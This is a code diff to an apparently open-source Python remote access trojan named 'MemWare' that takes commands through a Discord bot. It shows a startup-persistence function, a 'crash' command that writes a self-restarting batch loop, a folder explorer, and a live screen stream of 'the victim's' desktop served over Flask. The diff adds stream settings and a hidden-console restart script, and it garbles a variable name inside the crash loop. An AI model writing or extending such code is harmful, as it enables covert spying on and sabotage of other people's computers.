@@ -18,6 +18,7 @@ botToken = "bot-token-here" # Put your discord bot's token here
 
 ############################################################## CONFIG
 
+
 # Startup
 
 def settostartup():
@@ -433,11 +434,10 @@ def getdata(dataname):
     except Exception as e:
         return (False, e)
  
-def startstream():
+def startstream(screenheight, screenwidth, refreshtime):
     import cv2
     import mss
     import numpy
-    import ctypes
 
     from flask import render_template, Flask, Response
 
@@ -467,16 +467,16 @@ def startstream():
         @staticmethod
         def frames():
             '''Create a new frame every 2 seconds.'''
-            user32 = ctypes.windll.user32
+            print(screenheight)
             monitor = {
                 'top': 0,
                 'left': 0,
-                'width': 1990, #ADJUST YOUR SCREEN SIZE HERE (width)
-                'height': 1080 #ADJUST YOUR SCREEN SIZE HERE (height)
+                'width': screenwidth,
+                'height': screenheight
             }
             with mss.mss() as sct:
                 while True:
-                    time.sleep(0.5)
+                    time.sleep(refreshtime)
                     raw = sct.grab(monitor)
                     # Use numpy and opencv to convert the data to JPEG. 
                     img = cv2.imencode('.jpg', numpy.array(raw))[1].tobytes()
@@ -509,6 +509,8 @@ def startstream():
 
     @app.route('/MemWare/stream')
     def video_feed():
+        if getdata("streamstatus")[1] is False:
+            quit()
         return Response(gen(Camera()),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
@@ -542,7 +544,7 @@ async def crash(ctx):
         :a
         set /A variable = 1
         echo %variable%
-        set /A variable=%variable%*99
+        set /A settingtypeiable=%variable%*99
         echo %variable%
         start %0
         goto a
@@ -692,19 +694,73 @@ async def explorer(ctx, *, path: str="C:/"):
         await ctx.send("We don't have permission to that folder")
 
 @bot.command(brief="Web stream config")
-async def stream(ctx, var=None):
-    if var is None:
-        await ctx.send("Welcome to the stream config:\n\n To start the stream, use: (IP)+stream start")
+async def stream(ctx, settingtype=None, option=None, change: int=1):
+    if settingtype is None:
+        await ctx.send("Welcome to the stream config:\n\n To start the stream, use: (IP)+stream start\n To stop the stream, use: (IP)+stream stop\n To change settings, use (IP)+stream settings")
         return
-    if var.lower() == "start":
+    elif settingtype.lower() == "start":
         try:
-            streamthread = Thread(target=startstream, args=())
+            # Get stream settings
+            screenheight = getdata("screenheight")
+            screenwidth = getdata("screenwidth")
+            refreshtime = getdata("refreshtime")
+            if screenheight[0] is False:
+                screenheight = 1080
+            else:
+                screenheight = screenheight[1]
+            if screenwidth[0] is False:
+                screenwidth = 1990
+            else:
+                screenwidth = screenwidth[1]
+            if refreshtime[0] is False:
+                refreshtime = 0.5
+            else:
+                refreshtime = refreshtime[1]
+            jsonchange("streamstatus", True)
+
+            # Start stream thread
+            streamthread = Thread(target=startstream, args=(screenheight, screenwidth, refreshtime))
             streamthread.start()
-            await ctx.send(f"The stream should now be online on: http://{getip()}:5000/MemWare/stream")
+            
+            # Tell user
+            await ctx.send(f"The stream should now be online on: http://{getip()}:5000/MemWare/stream\n\nNote: if the stream screen is too small, try fiddling with stream settings")
         except RuntimeError:
             await ctx.send(f"The stream is already running!\n(http://{getip()}:5000/MemWare/stream)")
         except Exception as e:
-            await ctx.send(f"Something went wrong!\n({e})")
+            await ctx.send(f"Something went wrong!\n\n({e})")
 
+    elif settingtype.lower() == "stop":
+        jsonchange("streamstatus", False)
+        await ctx.send("The stream will stop when you leave the website")
+
+    elif settingtype.lower() == "settings":
+        if option is None:
+            await ctx.send("Available stream settings:\n\n - Screen height (screenheight)\n - Screen width (screenwidth)\n - Refresh time (refreshtime)")
+        elif change is None:
+            await ctx.send("You need to input the new value to the setting")
+        elif option.lower() == "screenheight":
+            jsonchange("screenheight", change)
+            await ctx.send(f"The screen height is now {change}\nThe machine has to be restarted for the settings to apply, or use (IP)+restart")
+
+        elif option.lower() == "screenwidth":
+            jsonchange("screenwidth", change)
+            await ctx.send(f"The screen width is now {change}\nThe machine has to be restarted for the settings to apply, or use (IP)+restart")
+        elif option.lower() == "refreshtime":
+            jsonchange("refreshtime", change)
+            await ctx.send(f"The stream's refresh time is now {change}\nThe machine has to be restarted for the settings to apply, or use (IP)+restart\nNote: Very low refresh times may cause lag on both the victim's and your's computer (when watching the stream)")
+    else:
+        await ctx.send("That is not a valid stream setting")
+
+@bot.command(brief="Restarts the whole script, only works in compiled form")
+async def restart(ctx):
+    await ctx.send("**Restarting the script _can_ lead to crashing the whole thing until the victim re-opens the computer**, restarting script now. This may take up to 10 seconds")
+    with open("restarter.bat", "w") as file:
+        file.write(f"""
+                    CONSOLESTATE /Hide
+                    TIMEOUT 10
+                    START {os.path.basename(__file__)}
+                   """)
+    os.startfile("restarter.bat")
+    quit()
 
 bot.run(botToken)
